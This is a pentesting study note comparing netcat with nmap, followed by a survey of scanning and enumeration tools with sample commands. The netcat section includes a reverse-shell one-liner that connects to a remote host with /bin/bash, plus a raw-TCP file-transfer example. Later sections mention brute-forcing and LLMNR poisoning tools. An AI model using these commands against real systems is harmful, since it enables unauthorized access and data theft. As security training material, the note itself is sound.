---
title: Network Reconnaissance
draft: false
tags:
  - tag1
  - tag2
NeedsReview: true
---
### Network Reconnaissance
#### 🔍 `nc` [[Netcat]] vs [[Nmap]]

**Manual Banner Grabbing / Custom Payloads**
`nc` allows you to **manually connect to a port** and send **custom input** to see how the service responds.
Example:

```bash
echo -e "HEAD / HTTP/1.0\r\n\r\n" | nc target.com 80
```

This is useful for **interacting with obscure or custom services** where `nmap`'s scripts might not work.

---

**Reverse Shells and Bind Shells**

`nc` can be used to **set up reverse or bind shells**, which is useful in post-exploitation or red teaming.

Example:

```bash
nc -lvnp 4444  # Listener
nc target.com 4444 -e /bin/bash  # Reverse shell
```

`nmap` is not designed for this kind of interaction.

---

**Simple TCP/UDP Client**

`nc` can act as a **lightweight TCP or UDP client**, useful for testing connectivity or service behavior.

Example:

```bash
nc -u target.com 53  # UDP DNS port
```

---

**Port Knocking**
You can use `nc` to simulate **port knocking** sequences manually, which `nmap` doesn’t support natively.

---

**File Transfers**
`nc` can be used to **transfer files** between systems over a raw TCP connection.
Example:

``` bash 
# Sender 
nc -l -p 1234 < file.txt 

# Receiver 
nc target.com 1234 > file.txt`
```

---
#### 🛠️ What `nmap` Does Better
- **Automated scanning and service detection**
- **OS fingerprinting**
- **Scriptable interactions via NSE (Nmap Scripting Engine)**
- **Network topology mapping**
- **Vulnerability detection
- **
---
#### 🧰 Other Essential Network Enumeration Tools
##### 1. **Masscan**
- **Purpose**: Extremely fast port scanner (like `nmap` but faster).
- **Use Case**: Scanning large IP ranges quickly.
- **Note**: Doesn't do service detection like `nmap`.
``` bash
masscan -p1-65535 192.168.1.0/24 --rate=10000
```

---

##### 2. **Netdiscover**
- **Purpose**: ARP-based network discovery tool.
- **Use Case**: Identifying live hosts on a local subnet (great for internal networks).
``` bash
netdiscover -r 192.168.1.0/24
```

---
##### 3. **Fping**
- **Purpose**: Fast ICMP ping sweeper.
- **Use Case**: Quickly identify live hosts.
``` bash
fping -a -g 192.168.1.0/24
```

---
##### 4. **Hping3**
- **Purpose**: Packet crafting tool.
- **Use Case**: Advanced scanning, firewall testing, and TCP/IP stack auditing.
``` bash
hping3 -S -p 80 -c 1 target.com
```

---
##### 5. **ZMap**
- **Purpose**: Internet-wide network scanner.
- **Use Case**: High-speed scanning of large address spaces (used in research).

---
##### 6. **Amass**
- **Purpose**: DNS enumeration and attack surface mapping.
- **Use Case**: Subdomain discovery and external asset mapping.
``` bash
amass enum -d example.com
```

---
##### 7. **Nessus / OpenVAS**
- **Purpose**: Vulnerability scanners.
- **Use Case**: Deep enumeration of services and known vulnerabilities.

---
##### 8. **Recon-ng**
- **Purpose**: Web-based reconnaissance framework.
- **Use Case**: OSINT and passive network enumeration.

---
#### 🧠 Summary

| Tool               | Primary Use                      | Strengths                      |
| ------------------ | -------------------------------- | ------------------------------ |
| `nmap`             | Port/service/OS detection        | Versatile, scriptable          |
| `nc`               | Manual interaction, shell access | Lightweight, flexible          |
| `masscan`          | Fast port scanning               | Speed                          |
| `netdiscover`      | Local network discovery          | ARP-based, simple              |
| `fping`            | ICMP sweep                       | Fast, efficient                |
| `hping3`           | Packet crafting                  | Custom scans, firewall testing |
| `zmap`             | Internet-wide scanning           | Research-grade speed           |
| `amass`            | DNS and subdomain enumeration    | External recon                 |
| `Nessus`/`OpenVAS` | Vulnerability scanning           | Deep service analysis          |

| Feature                | `nc` (Netcat) ✅ | `nmap` ✅             |
| ---------------------- | --------------- | -------------------- |
| Manual banner grabbing | ✅               | ⚠️ (limited via NSE) |
| Reverse/bind shell     | ✅               | ❌                    |
| File transfer          | ✅               | ❌                    |
| Port scanning          | ⚠️ (basic)      | ✅                    |
| OS/service detection   | ❌               | ✅                    |
| Scriptable enumeration | ❌               | ✅ (NSE)              |

####  Additional Techniques (Work In Progress)

##### 1. **SMB/NetBIOS Enumeration**

- Useful in internal networks for discovering shares, users, and machines.
- Tools:
    - `enum4linux`
    - `smbclient`
    - `smbmap`
    - `nmap` NSE scripts (`smb-enum-shares`, `smb-enum-users`)

##### 2. **SNMP Enumeration**

- If SNMP is open (UDP 161), it can leak system info, routing tables, etc.
- Tools:
    - `snmpwalk`
    - `onesixtyone`
    - `nmap` NSE (`snmp-info`, `snmp-interfaces`)

##### 3. **LDAP Enumeration**

- Common in Active Directory environments.
- Tools:
    - `ldapsearch`
    - `nmap` NSE (`ldap-search`, `ldap-rootdse`)

##### 4. **RPC Enumeration**

- Useful for enumerating users and groups on Windows systems.
- Tools:
    - `rpcclient`
    - `nmap` NSE (`rpcinfo`, `msrpc-enum`)

##### 5. **VoIP Enumeration (SIP)**

- If SIP (port 5060) is open, you can enumerate extensions.
- Tools:
    - `svmap`, `svwar`, `sipvicious`

##### 6. **NFS Enumeration**

- If NFS is exposed, you can list and mount shares.
- Tools:
    - `showmount`
    - `mount`
    - `nmap` NSE (`nfs-showmount`, `nfs-ls`)

##### 7. **RDP/SSH/VNC Banner Grabbing**

- Use `nmap`, `hydra`, or `rdpscan` to identify versions and test brute-force.

##### 8. **Nmap NSE Scripting (Deep Dive)**

- You mention NSE, but it’s worth emphasizing:
    - Vulnerability detection (`http-vuln-*`, `smb-vuln-*`)
    - Auth bypass (`http-auth-finder`)
    - Brute-force (`ftp-brute`, `ssh-brute`, etc.)
    - Malware detection (`http-malware-host`)

---

##### 🧰 Optional Tools to Mention

| Tool           | Purpose                               |
| -------------- | ------------------------------------- |
| `Responder`    | LLMNR/NBT-NS poisoning (internal)     |
| `CrackMapExec` | Post-recon enumeration & exploitation |
| `Metasploit`   | Auxiliary scanners and exploits       |
| `Ncrack`       | Network authentication brute-forcer   |
